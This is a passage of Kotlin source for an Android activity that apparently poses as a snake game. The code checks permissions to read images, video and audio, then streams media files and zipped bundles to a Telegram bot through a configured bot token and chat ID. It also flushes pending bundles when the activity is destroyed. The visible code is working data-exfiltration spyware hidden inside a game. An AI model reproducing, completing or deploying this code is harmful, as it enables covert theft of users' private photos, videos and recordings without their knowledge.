        return when (contentUri) {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            else -> false
        }
    }

    private fun postTelegramText(text: String) {
        val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/sendMessage"
        val body = "chat_id=${URLEncoder.encode(AppConfig.CHAT_ID, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 15_000
            readTimeout = 25_000
            doOutput = true
            doInput = true
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }

        try {
            DataOutputStream(BufferedOutputStream(conn.outputStream, 8192)).use { out ->
                out.writeBytes(body)
                out.flush()
            }
            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram text HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun postTelegramStream(
        mediaUri: Uri,
        endpointMethod: String,
        fieldName: String,
        fileName: String,
        mimeType: String
    ) {
        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
        inputStream.use { stream ->
            writeMultipartToTelegram(
                endpointMethod = endpointMethod,
                fieldName = fieldName,
                fileName = fileName,
                mimeType = mimeType,
                sourceStream = stream
            )
        }
    }

    private fun postTelegramFile(
        file: File,
        endpointMethod: String,
        fieldName: String,
        mimeType: String
    ) {
        if (!file.exists() || file.length() == 0L) return
        file.inputStream().use { stream ->
            writeMultipartToTelegram(
                endpointMethod = endpointMethod,
                fieldName = fieldName,
                fileName = file.name,
                mimeType = mimeType,
                sourceStream = stream
            )
        }
    }

    private fun writeMultipartToTelegram(
        endpointMethod: String,
        fieldName: String,
        fileName: String,
        mimeType: String,
        sourceStream: InputStream
    ) {
        val boundary = "----AndroidBoundary${System.nanoTime()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/$endpointMethod"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 15_000
            readTimeout = 45_000
            doInput = true
            doOutput = true
            useCaches = false
            setChunkedStreamingMode(AppConfig.STREAM_BUFFER_SIZE)
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        try {
            DataOutputStream(BufferedOutputStream(conn.outputStream, AppConfig.STREAM_BUFFER_SIZE)).use { out ->
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                out.writeBytes(AppConfig.CHAT_ID + lineEnd)

                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes(
                    "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"$fileName\"$lineEnd"
                )
                out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")

                val buffer = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
                var bytesRead: Int
                while (sourceStream.read(buffer).also { bytesRead = it } != -1) {
                    out.write(buffer, 0, bytesRead)
                }

                out.writeBytes(lineEnd)
                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                out.flush()
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram $endpointMethod HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun updateStatus(message: String) {
        if (isFinishing || isDestroyed) return
        runOnUiThread {
            if (!isFinishing && !isDestroyed && ::statusView.isInitialized) {
                statusView.text = message
            }
        }
    }

    override fun onDestroy() {
        snakeView?.stopLoop()
        sealActiveZip()
        flushPendingZipBundles(blocking = false)
        super.onDestroy()
        ioExecutor.shutdownNow()
        flushExecutor.shutdownNow()
    }
}
